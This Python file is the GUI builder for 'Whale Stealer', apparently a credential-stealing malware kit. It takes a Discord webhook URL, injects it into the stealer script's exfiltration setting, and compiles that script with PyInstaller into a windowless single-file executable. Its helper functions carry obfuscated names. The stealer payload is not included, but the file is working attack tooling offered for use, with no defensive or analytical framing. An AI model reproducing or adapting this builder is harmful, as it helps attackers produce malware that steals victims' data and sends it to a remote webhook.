import os
import shutil
import subprocess
import customtkinter

customtkinter.set_appearance_mode("dark")
customtkinter.set_default_color_theme("blue")

app = customtkinter.CTk()
app.title("Whale Stealer")
app.iconbitmap("images/whale.ico")
app.geometry("500x300")
app.resizable(False, False)
app.attributes("-fullscreen", False)

folder_build = "build"
folder_build2 = "dist"
folder_path = "build/whale"
script_path = "build/whale.py"
M5HD2K6MB1 = "whale.spec"


def M3HD1K4MB(folder_path):
    try:
        shutil.rmtree(folder_path)
        pass
    except Exception as e:
        pass

def M5HD2K6MB(M5HD2K6MB1):
    try:
        os.remove(M5HD2K6MB1)
        pass
    except FileNotFoundError:
        pass

def M2HD5K3MB(script_path):
    try:
        subprocess.check_call(['pyinstaller', '--onefile', '--noconsole', script_path])
        pass
    except subprocess.CalledProcessError:
        pass

def M8HD2K3MB():
    folder_name = folder_build
    try:
        os.mkdir(folder_name)
        pass
    except FileExistsError:
        pass

def M1HD6K3MB():
    source_file = "whale.py"
    destination_folder = "build"
    try:
        shutil.copy(source_file, destination_folder)
        pass
    except FileNotFoundError:
        pass
    except PermissionError:
        pass
    except IsADirectoryError:
        pass

def send_webhook(webhook_url):
    if webhook_url.startswith("https://discord.com/api/webhooks/"):
        print("✅ | Entered a correct webhook link. | ", webhook_url)
        M8HD2K3MB()
        M1HD6K3MB()
        M3HD3K3MB(webhook_url)
        M2HD5K3MB(script_path)
        os.startfile(folder_build)
        os.startfile(folder_build2)
        M3HD1K4MB(folder_path)
        M5HD2K6MB(M5HD2K6MB1)
    else:
        print("🔴 | Please provide a correct webhook link. | ", webhook_url)

def M3HD3K3MB(webhook_url):
    with open("build/whale.py", "r") as f:
        lines = f.readlines()
    with open("build/whale.py", "w") as f:
        for line in lines:
            if "webhook_url =" in line:
                f.write(f'    webhook_url = "{webhook_url}"\n')
            else:
                f.write(line)

    
title_label = customtkinter.CTkLabel(master=app, text="Whale Stealer", text_color=("white"), font=("Arial bold", 29))
title_label.place(relx=0.5, rely=0.25, anchor=customtkinter.CENTER)

webhook_entry = customtkinter.CTkEntry(master=app, width=350, placeholder_text="Webhook", font=("Arial", 12))
webhook_entry.place(relx=0.5, rely=0.45, anchor=customtkinter.CENTER)

build_button = customtkinter.CTkButton(master=app, text="BUILD", command=lambda: send_webhook(webhook_entry.get()), text_color=("white"), font=("Arial Bold", 12))
build_button.place(relx=0.5, rely=0.65, anchor=customtkinter.CENTER)

app.mainloop()